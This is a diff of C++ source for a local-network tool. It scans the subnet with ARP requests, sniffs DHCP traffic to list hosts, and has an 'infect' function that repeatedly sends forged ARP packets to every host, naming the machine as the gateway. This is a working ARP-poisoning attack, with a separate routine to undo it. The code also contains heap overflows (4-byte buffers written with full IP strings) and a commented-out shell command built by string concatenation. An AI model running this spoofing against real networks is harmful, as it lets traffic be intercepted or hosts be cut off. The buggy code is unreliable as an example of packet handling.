@@ -1,103 +1,179 @@
-#include "wscan.h"
-
-void Scan::full_scan(WPcapDevice* device, uint32_t ip_, list<Guest> v){
-    thread thread1(Scan::scan,device,ip_);
-    thread thread2(Scan::acquire,device,v,ip_);
-    thread1.join();
-    thread2.join();
-}
-
-Scan::Etharp Scan::makearppacket(WMac dmac, WMac smac, WMac tmac,WIp tip, WIp sip){
-    Etharp etharp;
-    etharp.eth.dmac_ = dmac;
-    etharp.eth.smac_ = smac;
-    etharp.eth.type_ = htons(WEthHdr::Arp);
-
-    etharp.arp.hrd_ = htons(WArpHdr::ETHER);
-    etharp.arp.pro_ = htons(WEthHdr::Ip4);
-    etharp.arp.hln_ = WMac::SIZE;
-    etharp.arp.pln_ = WIp::SIZE;
-    etharp.arp.op_ = htons(WArpHdr::Request);
-    etharp.arp.smac_ = smac;
-    etharp.arp.sip_ = htonl(sip);
-    etharp.arp.tmac_ = tmac;
-    etharp.arp.tip_ = htonl(tip);
-    return etharp;
-}
-
-void Scan::scan(WPcapDevice* device, uint32_t ip_){
-    char* gateway = (char*)malloc(sizeof(char)*4);
-    WPacket packet = WPacket();
-    packet.buf_.size_ = sizeof(Etharp);
-    Etharp etharp = makearppacket(WMac("FF:FF:FF:FF:FF:FF"),device->intf()->mac(),WMac("00:00:00:00:00:00"),WIp("0.0.0.0"),device->intf()->ip());
-
-    for(int l = 1; l<255; l++){
-        if((ip_&0x000000FF)==(l&0x000000FF))continue;
-        sprintf(gateway, "%u.%u.%u.%u",
-            (ip_ & 0xFF000000) >> 24,
-            (ip_ & 0x00FF0000) >> 16,
-            (ip_ & 0x0000FF00) >> 8,
-            (l & 0x000000FF));
-        string str(gateway);
-        etharp.arp.tip_ = htonl(WIp(str));
-        packet.buf_.data_ = reinterpret_cast<byte*>(&etharp);
-        device->write(packet.buf_);
-    }
-    if(gateway){
-        free(gateway);
-        gateway = NULL;
-    }
-}
-
-void Scan::acquire(WPcapDevice* device,list<Guest> v,uint32_t ip_)
+#include "net/wscan.h"
+void SendArp::infect()//infection function
 {
-    WPacket packet = WPacket();
-    time_t start, end;
-    start = time(NULL);
+    list<Host>::iterator iter;
+    Etharp etharp;
+    WPacket packet;
+
     while(1)
     {
-        if(device->WPcapCapture::read(&packet)==WPacket::Result::Ok)
+        gtrace("<size>");
+        std::cout<<v.size()<<std::endl;
+
+        for(iter = v.begin(); iter!=v.end();iter++)
+        {
+            gtrace("<sendarp>");
+            gtrace("%s",std::string((*iter).mac_).data());
+            gtrace("%s",std::string((*iter).ip_).data());
+
+            etharp.makeArppacket((*iter).mac_,ARPdevice.intf()->mac(),(*iter).mac_,(*iter).ip_,ARPdevice.intf()->gateway());
+            packet.buf_.data_ = reinterpret_cast<byte*>(&etharp);
+            packet.buf_.size_ = sizeof(Etharp);
+
+            for(int i =0; i<3; i++)//send arp packet
+                ARPdevice.write(packet.buf_);
+            sleep(1);
+        }
+    }
+}
+
+void SendArp::recover(Host host)//recover function
+{
+    Etharp etharp;
+    etharp.makeArppacket(host.mac_,mac_gate,host.mac_,host.ip_,ARPdevice.intf()->gateway());
+
+    WPacket packet;
+    packet.buf_.data_ = reinterpret_cast<byte*>(&etharp);
+    packet.buf_.size_ = sizeof(Etharp);
+
+    for(int i =0; i<3; i++)
+        ARPdevice.write(packet.buf_);
+}
+
+void Scan::scan()//full-scan function
+{
+    WPacket packet;
+    packet.buf_.size_ = sizeof(Etharp);
+    Etharp etharp;
+    etharp.makeArppacket(WMac("FF:FF:FF:FF:FF:FF"),FSdevice.intf()->mac(),WMac("00:00:00:00:00:00"),WIp("0.0.0.0"),FSdevice.intf()->ip());
+
+    WIntf* intf = FSdevice.intf();
+    uint32_t beginIp = (intf->ip() & intf->mask())+1;
+    uint32_t endIp = (intf->ip() | ~intf->mask())-1;
+    //find all ip connected to the network
+    for(uint32_t ip = beginIp; ip!=endIp; ip++){
+        if(WIp(ip)==intf->gateway())continue;
+        etharp.arp.tip_ = htonl(WIp(ip));
+        packet.buf_.data_ = reinterpret_cast<byte*>(&etharp);
+        for(int i = 0; i < 3; i++)
+            FSdevice.write(packet.buf_);
+    }
+}
+
+void Scan::acquire()//packet parsing(arp packet)
+{
+    WPacket packet;
+    list<Host>::iterator iter;
+    time_t start, end;
+    start = time(NULL);//time measuring
+    while(1)
+    {
+        if(FSdevice.WPcapCapture::read(&packet)==WPacket::Result::Ok)
         {
             if(packet.ethHdr_->type()!=WEthHdr::Arp)continue;
-            if(packet.ethHdr_->dmac_!=device->intf()->mac()||packet.arpHdr_->op()!=packet.arpHdr_->Reply)continue;
+            if(packet.ethHdr_->dmac_!=FSdevice.intf()->mac()||packet.arpHdr_->op()!=packet.arpHdr_->Reply)continue;
 
-            int flag1 = 0, flag2 = 0, flag3 = 0;
-            (packet.arpHdr_->sip() & 0xFF000000) >> 24 == (ip_& 0xFF000000)>>24 ? flag1 = 1 : 0;
-            (packet.arpHdr_->sip() & 0x00FF0000) >> 16 == (ip_& 0x00FF0000) >> 16 ? flag2 = 1 : 0;
-            (packet.arpHdr_->sip() & 0x0000FF00) >> 8 == (ip_& 0x0000FF00) >> 8 ? flag3 = 1 : 0;
+            WIp mask = FSdevice.intf()->mask();
+            Host g;
 
-            if(flag1&&flag2&&flag3)
+            if((packet.arpHdr_->sip()&mask)==(FSdevice.intf()->gateway()&mask))
             {
-                Guest g;
-                g.mac = packet.ethHdr_->smac();
-                g.ip = packet.arpHdr_->sip();
+                gtrace("<full scan>");
+                g.mac_ = packet.ethHdr_->smac();
+                g.ip_ = packet.arpHdr_->sip();
+                /*string fname = "nmblookup -A ";
+                string fullname = fname + string(g.ip_);
+                FILE *fp = popen(fullname.c_str(),"r");
+
+                if(fp == NULL){
+                    perror("popen() fail");
+                    exit(1);
+                }
+
+                char buf[1024];
+                string str;
+                fgets(buf,1024,fp);
+                if(fgets(buf,1024,fp)){
+                    string str(strtok(buf," "));
+                    str.erase(str.begin());
+                    g.name = (char*)malloc(sizeof(char)*str.size());
+                    strcpy(g.name,str.c_str());
+                    gtrace(str.c_str());
+                }*/
+                gtrace("%s",string(g.mac_).data());
+                gtrace("%s",string(g.ip_).data());
+            }
+
+            //removing duplication in list
+            int tmp = 0;
+            for(iter = v.begin(); iter!=v.end();iter++){
+                if((*iter).ip_==g.ip_){//if existing in list
+                    tmp = 1;
+                    break;
+                }
+            }
+            //if not in list
+            if(!tmp){
+                m.lock();
                 v.push_back(g);
+                m.unlock();
             }
         }
         end = time(NULL);
+        //time > 10seconds -> end
         if(end-start>10)return;
     }
 }
 
-void Scan::dhcp(WPcapDevice* device,list<Guest> v)
+void Scan::open(Scan* sc)//error generated
 {
-    WPacket packet = WPacket();
+    dhcp = new thread(&Scan::dhcpScan,sc);
+    thread scan_(&Scan::scan,sc);
+    thread acquire_(&Scan::acquire,sc);
+    dhcp->detach();
+    scan_.join();
+    acquire_.join();
+}
+
+void Etharp::makeArppacket(WMac dmac, WMac smac, WMac tmac,WIp tip, WIp sip)
+{
+    Etharp::eth.dmac_ = dmac;
+    Etharp::eth.smac_ = smac;
+    Etharp::eth.type_ = htons(WEthHdr::Arp);
+
+    Etharp::arp.hrd_ = htons(WArpHdr::ETHER);
+    Etharp::arp.pro_ = htons(WEthHdr::Ip4);
+    Etharp::arp.hln_ = WMac::SIZE;
+    Etharp::arp.pln_ = WIp::SIZE;
+    Etharp::arp.op_ = htons(WArpHdr::Request);
+    Etharp::arp.smac_ = smac;
+    Etharp::arp.sip_ = htonl(sip);
+    Etharp::arp.tmac_ = tmac;
+    Etharp::arp.tip_ = htonl(tip);
+}
+
+void Scan::dhcpScan()//dhcp packet parsing
+{
+    WPacket packet;
     while(1)
     {
-        if(device->WPcapCapture::read(&packet)==WPacket::Result::Ok)
+        if(DHdevice.WPcapCapture::read(&packet)==WPacket::Result::Ok)
         {
-            if(packet.ethHdr_->type()!=WEthHdr::Ip4)continue;
-            if(packet.ipHdr_->p()!=WIpHdr::Udp)continue;
-            if(packet.udpHdr_->sport()!=67&&packet.udpHdr_->dport()!=67)continue;//dhcp
+            if(packet.ethHdr_->type()!=WEthHdr::Ip4)continue;//is ip4 packet?
+            if(packet.ipHdr_->p()!=WIpHdr::Udp)continue;//is udp packet?
+            if(packet.udpHdr_->sport()!=67&&packet.udpHdr_->dport()!=67)continue;//Is dhcp packet?
+            if(!packet.ethHdr_->dmac_.isBroadcast())continue; // Is DHCP Request?
 
             packet.dhcpHdr_ = (WDhcpHdr*)packet.udpData_.data_;
+            gtrace("<Dhcp>");
 
-            Guest g;
-            g.mac = packet.dhcpHdr_->clientMac_;//get mac
+            Host g;
+            g.mac_ = packet.dhcpHdr_->clientMac_;//get mac
+            gtrace("%s",std::string(g.mac_).data());
 
             for(WDhcpHdr::Option* opt = packet.dhcpHdr_->first(); opt!=nullptr; opt=opt->next())
             {
-                if(opt->type_ == 50)//get ip
+                if(opt->type_ == WDhcpHdr::RequestedIpAddress)//get ip
                 {
                     char* buf = (char*)malloc(sizeof(char)*4);
                     for(int i = 0; i<opt->len_-1; i++)
@@ -105,7 +181,8 @@ void Scan::dhcp(WPcapDevice* device,list<Guest> v)
                     sprintf(buf+12,"%03d",*(&opt->len_+4));
 
                     string str(buf);
-                    g.ip = WIp(str);
+                    g.ip_ = WIp(str);
+                    gtrace("%s",std::string(g.ip_).data());
                 }
                 else if(opt->type_ == 12)//get name
                 {
@@ -114,7 +191,11 @@ void Scan::dhcp(WPcapDevice* device,list<Guest> v)
                         g.name[i] = *(&opt->len_+1+i);
                 }
             }
+
+            //using mutex
+            m.lock();
             v.push_back(g);
+            m.unlock();
         }
     }
 }
